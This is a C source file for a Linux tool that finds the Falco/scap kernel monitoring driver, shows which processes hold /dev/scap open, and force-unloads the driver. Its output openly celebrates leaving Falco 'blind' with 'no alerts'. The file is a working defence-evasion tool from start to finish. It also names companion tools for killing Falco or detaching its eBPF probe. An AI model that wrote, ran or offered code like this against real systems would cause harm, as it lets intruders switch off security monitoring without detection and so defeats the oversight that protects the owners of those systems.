#define _GNU_SOURCE
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <dirent.h>

#ifndef O_TRUNC
#define O_TRUNC 0x00000200
#endif

static const char *scap_modules[] = {
    "scap",
    "falco",
    "falco_probe",
    "falco-probe",
    "falcomodule",
    NULL
};

static int mod_exists(const char *name)
{
    FILE *f = fopen("/proc/modules", "r");
    if (!f) return 0;
    char line[512], mname[256];
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%255s", mname) == 1 && strcmp(mname, name) == 0) {
            found = 1; break;
        }
    }
    fclose(f);
    return found;
}

static int get_module_info(const char *name, int *refcnt, char *state, size_t stlen)
{
    FILE *f = fopen("/proc/modules", "r");
    if (!f) return -1;
    char line[512], mname[256], mstate[32];
    int rc = 0;
    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%255s %*u %d %*s %31s", mname, &rc, mstate) >= 2
            && strcmp(mname, name) == 0) {
            *refcnt = rc;
            snprintf(state, stlen, "%s", mstate);
            fclose(f);
            return 0;
        }
    }
    fclose(f);
    return -1;
}

static int do_delete_module(const char *name, int flags)
{
    return (int)syscall(SYS_delete_module, name, flags);
}

static int unload_module(const char *name, int force)
{
    int refcnt = 0;
    char state[32] = "unknown";

    if (!mod_exists(name)) {
        printf("  [*] '%s' not loaded\n", name);
        return 1;
    }

    get_module_info(name, &refcnt, state, sizeof(state));
    printf("  [*] found module '%s'  refcnt=%d  state=%s\n", name, refcnt, state);

    if (refcnt > 0 && !force) {
        printf("  [!] refcnt > 0 - use --force to bypass (O_TRUNC)\n");
        return -1;
    }

    int flags = force ? O_TRUNC : 0;
    printf("  [*] calling delete_module('%s', flags=0x%x)%s\n",
           name, flags, force ? " (force)" : "");

    if (do_delete_module(name, flags) == 0) {
        printf("  [+] '%s' unloaded - Falco has no kernel event source\n", name);
        printf("  [*] verify: /dev/scap0 should be gone now\n");
        return 0;
    }

    if (errno == EBUSY && !force) {
        printf("  [!] EBUSY - retry with --force (O_TRUNC)\n");
        return -1;
    }
    if (errno == EPERM) {
        printf("  [!] EPERM - need CAP_SYS_MODULE\n");
        return -1;
    }
    if (errno == ENOENT) {
        printf("  [*] already unloaded\n");
        return 0;
    }
    perror("  delete_module");
    return -1;
}

static void cmd_list(void)
{
    printf("[*] scanning /proc/modules for Falco/scap kernel drivers:\n");

    FILE *f = fopen("/proc/modules", "r");
    if (!f) { perror("/proc/modules"); return; }

    char line[512], name[256], state[32];
    int  refcnt;
    int  found = 0;
    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%255s %*u %d %*s %31s", name, &refcnt, state) < 2) continue;
        for (int i = 0; scap_modules[i]; i++) {
            if (strcasestr(name, scap_modules[i])) {
                printf("  [!] %-24s  refcnt=%-3d  state=%s\n", name, refcnt, state);
                found++;
                break;
            }
        }
    }
    fclose(f);

    if (!found) {
        printf("  [*] no scap/falco kernel modules found\n");
        printf("  [*] Falco may be using the eBPF probe - use bpf_detach_all or tetragon_blind\n");
    }

    printf("\n[*] /dev/scap devices (Falco kernel driver API):\n");
    DIR *d = opendir("/dev");
    if (d) {
        struct dirent *de;
        int scap_found = 0;
        while ((de = readdir(d))) {
            if (strncmp(de->d_name, "scap", 4) == 0) {
                printf("  /dev/%s\n", de->d_name);
                scap_found++;
            }
        }
        closedir(d);
        if (!scap_found) printf("  [*] none - kernel module not loaded\n");
    }
}

static void cmd_unload(int force)
{
    printf("[*] attempting to unload Falco kernel driver:\n");

    for (int i = 0; scap_modules[i]; i++) {
        int r = unload_module(scap_modules[i], force);
        if (r == 0) {

            printf("\n[*] post-unload: Falco userspace is running but blind\n");
            printf("[*] to prevent driver reload: tetragon_blind kill falco\n");
            printf("[*] or: use cgroup_freeze to suspend Falco before it reloads\n");
            return;
        }
        if (r == -1) return;

    }
    printf("[*] none of the known module names were loaded\n");
}

static void cmd_kill_dev(void)
{

    printf("[*] checking who holds /dev/scap0 open:\n");

    DIR *proc = opendir("/proc");
    if (!proc) { perror("/proc"); return; }

    int found = 0;
    struct dirent *de;
    while ((de = readdir(proc))) {
        if (de->d_name[0] < '1' || de->d_name[0] > '9') continue;
        pid_t pid = (pid_t)atoi(de->d_name);

        char fddir[128];
        snprintf(fddir, sizeof(fddir), "/proc/%d/fd", (int)pid);
        DIR *fdd = opendir(fddir);
        if (!fdd) continue;

        struct dirent *fde;
        while ((fde = readdir(fdd))) {
            if (fde->d_name[0] == '.') continue;
            char link[320], target[512];
            snprintf(link, sizeof(link), "/proc/%d/fd/%s", (int)pid, fde->d_name);
            ssize_t n = readlink(link, target, sizeof(target) - 1);
            if (n < 0) continue;
            target[n] = '\0';
            if (strncmp(target, "/dev/scap", 9) == 0) {
                printf("  pid=%-6d fd=%-6s → %s\n", (int)pid, fde->d_name, target);
                found++;
            }
        }
        closedir(fdd);
    }
    closedir(proc);

    if (!found) printf("  [*] no process has /dev/scap open\n");
    else printf("[*] kill those pids to drop refcnt, then retry unload\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr,
            "usage:\n"
            "  %s list                  show loaded Falco/scap kernel modules + /dev/scap*\n"
            "  %s unload [--force]      delete_module(scap/falco) - removes tracepoint hooks\n"
            "  %s kill-dev              show which pids hold /dev/scap0 (prevents unload)\n"
            "\nhow it works:\n"
            "  Falco's kernel module driver (scap.ko) registers tracepoints via\n"
            "  tracepoint_probe_register() for every syscall it monitors.\n"
            "  delete_module(2) calls the module's cleanup_module() function which\n"
            "  calls tracepoint_probe_unregister() for all of them, then frees the\n"
            "  module from memory. After this, Falco has no event source and generates\n"
            "  no alerts until the driver is reloaded.\n"
            "\n  --force uses O_TRUNC flag which forces removal even if refcnt > 0.\n"
            "  This is safe for scap.ko because its cleanup path handles in-flight\n"
            "  callbacks, but may cause kernel warnings in dmesg.\n"
            "\nFalco eBPF probe: use bpf_detach_all detach-all or tetragon_blind blind falco\n"
            "requires: CAP_SYS_MODULE\n",
            argv[0], argv[0], argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "list") == 0)
        cmd_list();
    else if (strcmp(argv[1], "unload") == 0)
        cmd_unload(argc >= 3 && strcmp(argv[2], "--force") == 0);
    else if (strcmp(argv[1], "kill-dev") == 0)
        cmd_kill_dev();
    else {
        fprintf(stderr, "unknown: %s\n", argv[1]);
        return 1;
    }
    return 0;
}
